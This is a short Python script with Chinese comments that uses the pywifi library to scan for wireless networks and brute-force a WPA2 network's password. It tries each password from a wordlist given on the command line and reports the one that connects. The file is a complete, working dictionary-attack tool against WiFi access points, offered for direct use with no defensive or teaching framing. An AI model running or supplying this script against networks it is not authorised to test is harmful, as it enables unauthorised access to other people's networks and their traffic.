import pywifi
import sys
import time
from pywifi import const

def gic():
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    if ifaces in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]:
        print('已连接')
    else:
        print('未连接')

def scan_wifi():
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    time.sleep(5) #休眠一下,让无线网卡搜索信号
    bessis = ifaces.scan_results()
    for data in  bessis:
        print("ssid:%s,mac:%s,signal:%s" %(data.ssid,data.bssid,data.signal))  # 所有WiFi名
        # print(data.bssid)  # mac地址
        # print(data.signal)  # 信号强度(值越大信号越强)

def wifiConnect(wifi,ssid,pwd):
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    # print(ifaces.name())
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # print('开始破解')
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.key = pwd
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除所有的Wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        temp_profile = ifaces.add_network_profile(profile)

        ifaces.connect(temp_profile)
        time.sleep(4)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已连接")
        return True






def testWifi(ssid,passPath):
    print("开始破解:%s" % ssid)
    # path = 'pass.txt'
    file = open(passPath,"r")

    wifi = pywifi.PyWiFi()
    flag = True
    while flag:
        try:
            pwd = file.readline()
            if not pwd:
                print("破解结束")
                break
            pwd = pwd.strip()
            # print("尝试密码:%s" % pwd)
            if wifiConnect(wifi,ssid,pwd):
                print('破解成功率:ssid:%s,密码:%s' %(ssid,pwd))
                flag = False
            # print(pwd.strip())
            # print("读取的数据为: %s" % (pwd))
        except:
            print("出错")
            continue
    # for line in file.readlines(100):
    #     line = line.strip()  # 去掉每行头尾空白
    #     print ("读取的数据为: %s" % (line))

def showWin():
    pass


if __name__ == '__main__':
    # bies()
    # gic()
    ssid = sys.argv[1]
    passPath = sys.argv[2]
    # ssid = "hao"
    # passPath = "D:\\PycharmProjects\\untitled\\venv\\pass.txt"
    testWifi(ssid,passPath)
    # scan_wifi()